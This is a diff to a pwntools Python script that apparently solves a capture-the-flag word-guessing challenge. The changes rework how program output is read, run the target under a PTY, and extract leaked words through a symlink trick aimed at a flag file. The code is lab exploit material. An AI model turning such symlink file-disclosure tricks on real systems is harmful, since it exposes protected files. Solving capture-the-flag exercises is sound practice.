@@ -11,14 +11,31 @@ WORD_SIZE = 5
 # Defines our alphabet
 ALPHABET = string.ascii_uppercase + '_{}'
 
+# Defines the hit and miss marker
+HIT_MARKER = b'Great job on guessing the word '
+MISS_MARKER = b'You failed guessing the word '
+
+def recv_until_next_input(p, timeout=0.01):
+    """
+        Received all output until next input is required.
+    """
+
+    # Receive until a timeout
+    output = b''
+    while True:
+        new_output = p.recv(timeout=timeout)
+        if new_output == b'':
+            return output
+        output += new_output
+
 def find_dictionary_word(p, dictionary_words):
     """
         Finds a dictionary word.
     """
     
     # Receive until we wait for input
-    p.recvuntil(b'Enter your current attempt: ')
-    
+    recv_until_next_input(p)
+ 
     # Iterate all options
     attempt_num = 0
     with log.progress('Attempting to get one dictionary word') as pbar:
@@ -28,8 +45,7 @@ def find_dictionary_word(p, dictionary_words):
             attempt_num += 1
             pbar.status(f'({attempt_num} / {len(dictionary_words)})')
             p.sendline(candidate.encode())
-            p.recvuntil(b'Enter your current attempt: ')
-            output = p.recvuntil(b'Enter your current attempt: ')
+            output = recv_until_next_input(p)
             
             # Check if output has meaningful data
             if b'ERROR' not in output:
@@ -70,7 +86,7 @@ def run_symlink_attack(target_dir):
     log.info(f'Created symlink for flag at "{flag_symlink_path}"')
 
     # Run process
-    p = process(exe_symlink_path)
+    p = process(exe_symlink_path, stdin=process.PTY, stdout=process.PTY)
     return (p, flag_words)
 
 def get_dictionary_words(target_dir):
@@ -120,17 +136,22 @@ def solve():
                 output = b''
 
                 # Exhaust all attempts with dictionary word
-                while b'You failed guessing' not in output:
+                while b'Play again [Y/N]:' not in output:
 
                     # Send next dictionary word
                     p.sendline(dictionary_word.encode())
-                    output = p.recvuntil(b': ')
-                    if b'You failed guessing' in output:
-                        break
-                    output = p.recvuntil(b': ')
+                    output = recv_until_next_input(p)
+                    if b'Great job' in output:
+                        import pdb; pdb.set_trace
 
                 # Extract word
-                word = ''.join([ c for c in output.split(b'You failed guessing the word ')[1].split(b'\n')[0].decode() if c in ALPHABET ])
+                if HIT_MARKER in output:
+                    marker = HIT_MARKER
+                elif MISS_MARKER in output:
+                    marker = MISS_MARKER
+                else:
+                    raise Exception('Unexpected output from program')
+                word = ''.join([ c for c in output.split(marker)[1].split(b'\n')[0].decode() if c in ALPHABET ])
                 assert len(word) == WORD_SIZE, Exception(f'Got an unexpected word "{word}"')
                 if word not in gathered_words:
                     gathered_words.add(word)
@@ -139,6 +160,9 @@ def solve():
 
                 # Continue playing
                 p.sendline(b'Y')
+
+            # Success status
+            pbar.success(f'Got {flag_words} chunks.')
 
     # Log exceptions and quit
     except IOError as ex:
